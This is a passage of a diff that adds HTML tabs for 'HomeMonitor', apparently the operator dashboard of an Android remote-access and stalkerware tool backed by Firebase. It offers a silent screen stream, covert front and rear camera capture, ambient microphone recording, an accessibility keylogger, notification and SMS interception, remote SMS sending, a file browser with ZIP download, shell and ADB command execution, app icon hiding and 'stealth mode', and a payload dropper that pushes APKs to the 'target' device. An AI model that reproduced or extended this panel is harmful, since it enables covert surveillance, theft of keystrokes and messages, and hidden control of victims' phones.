+                        <div class="alert alert-success py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-desktop me-2"></i><strong>🎮 WebStream Guidelines:</strong> Live P2P WebRTC screen streaming via silent Accessibility frame capture (<150ms latency, zero cloud storage load).
+                        </div>
+                        <div class="d-flex justify-content-between align-items-center mb-3">
+                            <h4 class="fw-bold text-success mb-0"><i class="fa-solid fa-desktop me-2"></i>WebStream Live Screen Viewport</h4>
+                            <span class="badge bg-success bg-opacity-10 text-success border border-success px-3 py-2" id="p2pStatusBadge">P2P WebRTC Standby</span>
+                        </div>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary fw-bold" id="startP2pWebStreamBtn"><i class="fa-solid fa-play me-1"></i>Start Live P2P WebStream</button>
+                            <button class="btn btn-outline-danger fw-bold" id="stopP2pWebStreamBtn"><i class="fa-solid fa-stop me-1"></i>Stop Stream</button>
+                        </div>
+                        <div class="bg-dark rounded p-2 d-flex justify-content-center align-items-center" style="min-height: 480px;">
+                            <canvas id="liveScreenCanvas" width="360" height="780" class="border border-secondary rounded shadow" style="max-height: 520px; width: auto; background-color: #000;"></canvas>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: FILE STORAGE EXPLORER -->
+                <div class="tab-panel d-none" id="tab-file-explorer">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-warning py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-folder-open me-2"></i><strong>File Explorer Guidelines:</strong> Browse internal storage directories, list files, and download folder ZIP packages.
+                        </div>
+                        <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-folder-open me-2"></i>Storage File Directory</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="/ls"><i class="fa-solid fa-list me-1"></i>/ls Directory</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="/pwd"><i class="fa-solid fa-folder me-1"></i>/pwd Location</button>
+                            <button class="btn btn-homemonitor-primary exec-cmd" data-cmd="/zip Download"><i class="fa-solid fa-file-zipper me-1"></i>ZIP Download Folder</button>
+                        </div>
+                        <div class="log-output-box p-3" style="height: 350px; overflow-y: auto;" id="fileExplorerOutput">
+                            [File Explorer] Subscribed to file system stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: TERMUX LINUX SHELL (INTERACTIVE TERMINAL UI) -->
+                <div class="tab-panel d-none" id="tab-termux-shell">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-success py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-terminal me-2"></i><strong>💻 Termux Shell Guidelines:</strong> Execute rootless Linux shell commands directly in the Termux environment on the device.
+                        </div>
+                        <h4 class="fw-bold text-success"><i class="fa-solid fa-terminal me-2"></i>Termux Linux Terminal Console</h4>
+                        <p class="text-homemonitor-secondary small">Interactive command execution and output stream.</p>
+
+                        <div class="d-flex gap-2 mb-3 flex-wrap">
+                            <button class="btn btn-sm btn-outline-secondary termux-quick" data-sh="uname -a">uname -a</button>
+                            <button class="btn btn-sm btn-outline-secondary termux-quick" data-sh="ls -la /sdcard">ls /sdcard</button>
+                            <button class="btn btn-sm btn-outline-secondary termux-quick" data-sh="pkg list-installed">pkg list</button>
+                            <button class="btn btn-sm btn-outline-secondary termux-quick" data-sh="top -n 1">top</button>
+                            <button class="btn btn-sm btn-outline-secondary termux-quick" data-sh="ifconfig">ifconfig</button>
+                        </div>
+
+                        <!-- Black Terminal Box -->
+                        <div class="log-output-box p-3 mb-3 font-monospace" style="height: 350px; overflow-y: auto;" id="termuxConsoleOutput">
+                            [Termux Linux Shell v0.118.0 Connected]
+$
+                        </div>
+
+                        <form id="termuxForm" class="d-flex gap-2">
+                            <span class="input-group-text bg-black text-success border-secondary font-monospace">$</span>
+                            <input type="text" id="termuxInput" class="form-control bg-black text-success border-secondary font-monospace" placeholder="Enter Termux shell command (e.g. ls, uptime, whoami)..." required>
+                            <button type="submit" class="btn btn-homemonitor-success fw-bold"><i class="fa-solid fa-paper-plane me-1"></i>Execute</button>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- TAB: TEXT MESSAGES (SMS) -->
+                <div class="tab-panel d-none" id="tab-sms-messages">
+                    <div class="card card-homemonitor p-4 mb-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-comment-sms me-2"></i><strong>💬 SMS Manager Guidelines:</strong> View received SMS messages or send outbound SMS remotely from the device.
+                        </div>
+                        <h4 class="fw-bold text-info mb-3"><i class="fa-solid fa-paper-plane me-2"></i>Send Remote SMS</h4>
+                        <form id="smsSendForm" class="row g-3 mb-4">
+                            <div class="col-md-4">
+                                <label for="smsPhoneNum" class="form-label extra-small text-uppercase fw-bold text-homemonitor-secondary">Recipient Phone Number</label>
+                                <input type="text" id="smsPhoneNum" class="form-control" placeholder="+1234567890" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="smsMsgText" class="form-label extra-small text-uppercase fw-bold text-homemonitor-secondary">SMS Message Content</label>
+                                <input type="text" id="smsMsgText" class="form-control" placeholder="Enter message text..." required>
+                            </div>
+                            <div class="col-md-2 d-flex align-items-end">
+                                <button type="submit" class="btn btn-homemonitor-primary w-100 fw-bold"><i class="fa-solid fa-paper-plane me-1"></i>Send SMS</button>
+                            </div>
+                        </form>
+                        <h5 class="fw-bold text-homemonitor-primary mb-2">SMS Inbox History</h5>
+                        <div class="log-output-box p-3" style="height: 250px; overflow-y: auto;" id="smsLogOutput">
+                            [SMS System] Waiting for SMS inbox stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: AMBIENT MIC RECORDER -->
+                <div class="tab-panel d-none" id="tab-ambient-mic">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-microphone me-2"></i><strong>🎙️ Ambient Mic Guidelines:</strong> Record ambient mic audio in 5s to 120s duration clips and listen back directly.
+                        </div>
+                        <h4 class="fw-bold text-info"><i class="fa-solid fa-microphone me-2"></i>Ambient Mic Recording Studio</h4>
+                        <div class="d-flex gap-2 align-items-center mb-4 mt-3">
+                            <label for="micDurationSelect" class="form-label mb-0 fw-bold extra-small text-uppercase text-homemonitor-secondary">Duration:</label>
+                            <select id="micDurationSelect" class="form-select border style-width-auto" style="width: 140px;">
+                                <option value="10">10 Seconds</option>
+                                <option value="15" selected>15 Seconds</option>
+                                <option value="30">30 Seconds</option>
+                                <option value="60">60 Seconds</option>
+                            </select>
+                            <button class="btn btn-homemonitor-primary fw-bold" id="startMicRecordBtn"><i class="fa-solid fa-circle-dot me-1 text-danger"></i>Record Ambient Audio</button>
+                        </div>
+                        <div class="log-output-box p-3" style="height: 250px; overflow-y: auto;" id="micLogOutput">
+                            [Ambient Mic] Waiting for audio recordings...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: CAMERA STUDIO -->
+                <div class="tab-panel d-none" id="tab-camera-studio">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-warning py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-camera me-2"></i><strong>📸 Camera Studio Guidelines:</strong> Capture silent photos using the rear or front camera lens.
+                        </div>
+                        <h4 class="fw-bold text-warning"><i class="fa-solid fa-camera me-2"></i>Camera Studio Photo Capture</h4>
+                        <div class="d-flex gap-2 mb-4 mt-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="/camera"><i class="fa-solid fa-camera me-1"></i>Capture Rear Photo</button>
+                            <button class="btn btn-homemonitor-success exec-cmd fw-bold" data-cmd="/frontcam"><i class="fa-solid fa-user-large me-1"></i>Capture Front Photo</button>
+                        </div>
+                        <div class="log-output-box p-3" style="height: 250px; overflow-y: auto;" id="cameraLogOutput">
+                            [Camera Studio] Waiting for photo captures...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: BROWSER HISTORY & OPEN URL -->
+                <div class="tab-panel d-none" id="tab-browser-history">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-compass me-2"></i><strong>🌐 Browser History Guidelines:</strong> Inspect web search history and remotely open web URLs in the target browser.
+                        </div>
+                        <h4 class="fw-bold text-info mb-3"><i class="fa-solid fa-globe me-2"></i>Remote Browser URL Opener</h4>
+                        <form id="openUrlForm" class="d-flex gap-2 mb-4">
+                            <input type="url" id="targetUrlInput" class="form-control" placeholder="https://example.com" required>
+                            <button type="submit" class="btn btn-homemonitor-primary fw-bold"><i class="fa-solid fa-arrow-up-right-from-square me-1"></i>Open URL</button>
+                        </form>
+                        <h5 class="fw-bold text-homemonitor-primary mb-2">Browser History Feed</h5>
+                        <div class="log-output-box p-3" style="height: 250px; overflow-y: auto;" id="browserLogOutput">
+                            [Browser History] Waiting for web activity logs...
+                        </div>
+                    </div>
+                </div>
+
+
+
+                <!-- TAB: MDM, SHIZUKU & STEALTH -->
+                <div class="tab-panel d-none" id="tab-mdm-security">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-user-shield me-2"></i><strong>🛡️ MDM & Stealth Guidelines:</strong> Toggle app launcher icon hiding, stealth screen overlay, Shizuku ADB, or trigger remote lock/wipe.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-shield-virus me-2"></i>MDM, Shizuku & Stealth Controls</h4>
+                        <div class="d-flex gap-2 flex-wrap mb-4">
+                            <button class="btn btn-outline-danger exec-cmd" data-cmd="/hideapp">🙈 Hide App Icon</button>
+                            <button class="btn btn-outline-success exec-cmd" data-cmd="/unhideapp">👁️ Un-hide App Icon</button>
+                            <button class="btn btn-outline-warning exec-cmd" data-cmd="/stealth on">🕶️ Stealth Mode ON</button>
+                            <button class="btn btn-outline-secondary exec-cmd" data-cmd="/stealth off">☀️ Stealth Mode OFF</button>
+                            <button class="btn btn-outline-primary exec-cmd" data-cmd="/lock">🔒 Lock Device Screen</button>
+                        </div>
+                        <form id="shizukuForm" class="d-flex gap-2 mb-3">
+                            <input type="text" id="shizukuCmdInput" class="form-control font-monospace" placeholder="Enter Shizuku rootless ADB command (e.g. pm list packages)..." required>
+                            <button type="submit" class="btn btn-danger fw-bold">Execute Shizuku ADB</button>
+                        </form>
+                        <div class="log-output-box p-3" style="height: 250px; overflow-y: auto;" id="mdmLogOutput">
+                            [MDM Security] Ready for security audit commands...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: 3-COLUMN SOCIAL CHAT WORKSPACE (TINDER & SOCIAL NETWORKS REFERENCE LAYOUT) -->
+                <div class="tab-panel d-none" id="tab-social-chat">
+                    <div class="card card-homemonitor p-0 overflow-hidden border-0 social-workspace-container" style="height: calc(100vh - 160px);">
+                        <div class="row g-0 h-100">
+                            <!-- COLUMN 2: CONVERSATIONS & CONTACTS LIST PANEL -->
+                            <div class="col-md-4 border-end border-dark social-conv-list-panel h-100 d-flex flex-column">
+                                <div class="p-3 border-bottom border-dark bg-black">
+                                    <h6 class="fw-bold text-light mb-2" id="socialHeaderTitle">💬 Social Messages</h6>
+                                    <!-- TAB 1: CONVERSATIONS & TAB 2: CONTACTS -->
+                                    <ul class="nav nav-pills nav-justified small" id="socialConvTabs">
+                                        <li class="nav-item">
+                                            <button class="nav-link active py-1 btn-sm" id="tabConversationsBtn">CONVERSATIONS</button>
+                                        </li>
+                                        <li class="nav-item">
+                                            <button class="nav-link text-secondary py-1 btn-sm" id="tabContactsBtn">CONTACTS</button>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="overflow-y-auto flex-grow-1" id="socialConvList">
+                                    <!-- Rendered dynamically by social.js -->
+                                </div>
+                            </div>
+
+                            <!-- COLUMN 3: CONVERSATION TIMELINE VIEWER PANEL -->
+                            <div class="col-md-8 h-100 d-flex flex-column bg-dark text-light">
+                                <div class="p-3 border-bottom border-secondary bg-black d-flex align-items-center justify-content-between">
+                                    <div class="d-flex align-items-center gap-2">
+                                        <i class="fa-solid fa-comments text-info"></i>
+                                        <h6 class="mb-0 fw-bold text-light" id="activeConvContactName">Select a conversation...</h6>
+                                    </div>
+                                    <span class="badge bg-secondary extra-small">Real-Time Sync</span>
+                                </div>
+
+                                <!-- CHRONOLOGICAL MESSAGE TIMELINE -->
+                                <div class="p-4 overflow-y-auto flex-grow-1 font-monospace" id="socialMessageTimeline" style="background-color: #222627;">
+                                    <div class="text-center text-muted small mt-5">Select a contact conversation on the left to view message history.</div>
+                                </div>
+
+                                <!-- INTERACTIVE CHAT INPUT FORM (APP MIMIC) -->
+                                <div class="p-3 border-top border-secondary bg-black">
+                                    <form id="socialChatForm" class="d-flex gap-2">
+                                        <input type="text" id="socialChatInput" class="form-control bg-dark text-light border-secondary small" placeholder="Type a message to simulate reply..." required>
+                                        <button type="submit" class="btn btn-homemonitor-primary fw-bold"><i class="fa-solid fa-paper-plane me-1"></i>Send</button>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: INSTALLED APPLICATIONS -->
+                <div class="tab-panel d-none" id="tab-installed-apps">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-cubes me-2"></i><strong>Installed Applications Guidelines:</strong> View and search packages installed on the target device.
+                        </div>
+                        <h4 class="fw-bold text-info mb-3"><i class="fa-solid fa-cubes me-2"></i>Installed Applications Registry</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="/termux pm list packages -3"><i class="fa-solid fa-list me-1"></i>List 3rd-Party Packages</button>
+                            <button class="btn btn-outline-secondary exec-cmd fw-bold" data-cmd="/termux pm list packages"><i class="fa-solid fa-cubes me-1"></i>List All System Packages</button>
+                        </div>
+                        <div class="log-output-box p-3 font-monospace" style="height: 350px; overflow-y: auto;" id="installedAppsOutput">
+                            [Applications] Awaiting installed package list telemetry stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: SCREENRECORDER CLIPS -->
+                <div class="tab-panel d-none" id="tab-screenrecorder">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-circle-play me-2"></i><strong>Screenrecorder Guidelines:</strong> Trigger live screenshot capture or screen clip recording.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-circle-play me-2"></i>Screenrecorder & Screenshots</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!screenshot"><i class="fa-solid fa-desktop me-1"></i>Capture Live Screenshot</button>
+                            <button class="btn btn-outline-danger exec-cmd fw-bold" data-cmd="/screenrecord 10"><i class="fa-solid fa-video me-1"></i>Record 10s Screen Clip</button>
+                        </div>
+                        <div class="log-output-box p-3 font-monospace" style="height: 350px; overflow-y: auto;" id="screenrecorderOutput">
+                            [Screenrecorder] Awaiting screen capture stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: KEYSTROKE KEYLOGGER -->
+                <div class="tab-panel d-none" id="tab-keylogger">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-keyboard me-2"></i><strong>Keystroke Keylogger Guidelines:</strong> View real-time keystrokes captured via System Accessibility.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-keyboard me-2"></i>Accessibility Keystroke Keylog Stream</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!keylog"><i class="fa-solid fa-download me-1"></i>Dump Keylogger Feed</button>
+                        </div>
+                        <div class="log-output-box p-3 font-monospace" style="height: 350px; overflow-y: auto;" id="keyloggerLogOutput">
+                            [Keylogger] Subscribed to real-time accessibility keylog stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: NOTIFICATION CENTER -->
+                <div class="tab-panel d-none" id="tab-notifications">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-warning py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-bell me-2"></i><strong>Notification Center Guidelines:</strong> Intercept system notifications, chat alerts, and app toasts.
+                        </div>
+                        <h4 class="fw-bold text-warning mb-3"><i class="fa-solid fa-bell me-2"></i>System Notification Feed</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="!notification"><i class="fa-solid fa-download me-1"></i>Dump Notification Stream</button>
+                        </div>
+                        <div class="log-output-box p-3 font-monospace" style="height: 350px; overflow-y: auto;" id="notificationsLogOutput">
+                            [Notification Center] Subscribed to live notification listener stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: REMOTE FILE DROPPER -->
+                <div class="tab-panel d-none" id="tab-file-dropper">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-success py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-cloud-arrow-up me-2"></i><strong>Remote File Dropper Guidelines:</strong> Push remote payload files or APK updates directly to target storage.
+                        </div>
+                        <h4 class="fw-bold text-success mb-3"><i class="fa-solid fa-cloud-arrow-up me-2"></i>Remote Payload & File Dropper</h4>
+                        <form id="fileDropperForm" class="row g-3 mb-3">
+                            <div class="col-md-5">
+                                <input type="text" id="dropperTargetUrl" class="form-control" placeholder="Remote File/APK Direct URL..." required>
+                            </div>
+                            <div class="col-md-4">
+                                <input type="text" id="dropperDestination" class="form-control" placeholder="Save Path (e.g. /sdcard/Download/file.apk)" required>
+                            </div>
+                            <div class="col-md-3">
+                                <button type="submit" class="btn btn-homemonitor-primary w-100 fw-bold"><i class="fa-solid fa-download me-1"></i>Push File</button>
+                            </div>
+                        </form>
+                        <div class="log-output-box p-3 font-monospace" style="height: 250px; overflow-y: auto;" id="fileDropperOutput">
+                            [File Dropper] Ready for payload transfer requests...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB: VIDEOS LIBRARY -->
+                <div class="tab-panel d-none" id="tab-videos">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-danger py-2 px-3 mb-3 small">
+                            <i class="fa-solid fa-film me-2"></i><strong>Videos Library Guidelines:</strong> Browse recorded device videos and camera clips.
+                        </div>
+                        <h4 class="fw-bold text-danger mb-3"><i class="fa-solid fa-film me-2"></i>Device Video Library</h4>
+                        <div class="d-flex gap-2 mb-3">
+                            <button class="btn btn-homemonitor-primary exec-cmd fw-bold" data-cmd="/syncmedia 24"><i class="fa-solid fa-download me-1"></i>Dump Video Media ZIP (24h)</button>
+                        </div>
+                        <div class="log-output-box p-3 font-monospace" style="height: 350px; overflow-y: auto;" id="videosLogOutput">
+                            [Videos Library] Awaiting video file stream...
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DEFAULT FALLBACK PANEL -->
+                <div class="tab-panel d-none" id="tab-generic">
+                    <div class="card card-homemonitor p-4">
+                        <div class="alert alert-info py-2 px-3 mb-3 small" id="genericGuideline">
+                            <i class="fa-solid fa-circle-info me-2"></i><strong>Feature Guidelines:</strong> Real-time telemetry stream for selected category.
+                        </div>
+                        <h4 class="fw-bold text-homemonitor-primary" id="genericTabTitle">Telemetry Report</h4>
+                        <div class="log-output-box p-3 mt-3" style="height: 450px; overflow-y: auto;" id="genericLogOutput">
+                            [System] Connected to Firebase Management Gateway. Awaiting telemetry stream...
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Firebase Web SDK & App JS -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script src="js/firebase-config.js"></script>
+    <script src="js/auth.js"></script>
+    <script src="js/routes.js"></script>
+    <script src="js/social.js"></script>
+    <script src="js/webrtc-manager.js"></script>
+    <script src="js/tabs.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
